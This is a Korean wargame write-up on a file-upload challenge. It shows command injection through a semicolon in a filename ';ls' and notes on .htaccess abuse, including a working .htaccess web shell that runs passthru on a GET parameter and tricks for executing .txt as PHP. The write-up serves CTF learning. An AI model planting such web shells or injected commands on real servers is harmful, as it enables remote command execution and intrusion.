# 문제

- 파일을 메모한줄과 함께 업로드 받는다
- 업로드된 리스트를 확인할 수 있고 삭제도 가능하고 업로드된 파일을 열어볼 수 있다.
- php도 텍스트로 인식된다.

# 풀이

- 처음엔 `.htaccess`인젝션 문제인줄 알았다.
  - 하지만 php로 인식하게 만드는 `.htaccess`를 인젝션 해도 php가 실행이 안됬다.
- XSS 인젝션을 해보려고 시도해봤다.
  - 알고있는 우회기법이 없어서
  - 쿼터+스크립트정도 넣어봤다.
  - 하지만 이역시 안됬..
  - 이것도 아닌것 같았다
    - XSS는 잘모르지만
    - 워게임 문제에서 아무런 힌트없이 우회해서 XSS시킬것 같진 않았다.
- 포기하고 구글링을 더 해봤다.
  - 하지만 관련 내용은 없었다.
- 이번 문제는 포기하고 풀이를 검색해봤다.
  - delete 할 때 rm 명령어가 실행되는 것이었고
  - 파일명에 세미콜론을 붙여서 추가 명령어가 실행되게끔 만드는거란다.
  - 그런데 게싱과정이 하나같이 석연치 않다..
    - 어떻게 대뜸 rm 명령어가 실행될거라고 생각을 하지?
    - php에는 삭제함수가 따로 없나..?
    - 그리고 풀이에서 하나같이 다 `;ls`를 해보는데
    - 명령어의 결과값이 페이지에 노출될거라고 어떻게 예상하는거지?
    - 문제페이지를 보면 어디에도 명령어 결과를 리턴해주는 내용이 티끌조차 안보이는데..
- 도움을 받을 수 있는 제대로된 풀이가 없어서 아쉬웠다.
- 어쨌든
  - old로 바뀐 지금 ls 명령을 실행되게 만들면
  - flag값이 파일명으로 출력된다.

# 알게된 것

### .htaccess

- 현재 위치한 폴더의 http설정을 바꿀수 있게 해준다.

  - `/etc/httpd/conf.d `는 글로벌 설정 파일이다.

- 이용 방식

  - *`txt` 확장자를 php로 인식하여 실행되게 만들기*

    - `.htaccess` 파일 내용 수정 후 업로드
      -   `AddType application/x-httpd-php .txt`
    - `php`파일을 `txt`로 확장자 변경 후 업로드 및 실행

  - *`.htaccess`자체를 웹쉘로 이용*

    - `.htaccess` 수정 후 업로드

      ```php
      <Files ~ "^\.ht">
      
      Order allow, deny
      
      Allow from all
      
      </Files>
      
      interpreted
      
      AddType application/x-httpd-php .htaccess
      
      
      
      <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
      ```

  - *PHP 엔진 끄고 php 코드 읽기*

    - `.htaccess` 수정 후 업로드

      ```php
      php_flag engine off
      
      AddType text/plain php
      ```

- [출처 - hyunmini](https://hyunmini.tistory.com/48)